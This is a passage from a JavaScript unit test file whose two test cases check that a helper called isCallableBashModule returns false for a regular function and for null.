  it('should return false for regular functions', () => {
    const fn = () => {}
    expect(isCallableBashModule(fn)).toBe(false)
  })

  it('should return false for null', () => {
    expect(isCallableBashModule(null)).toBe(false)
  })
})
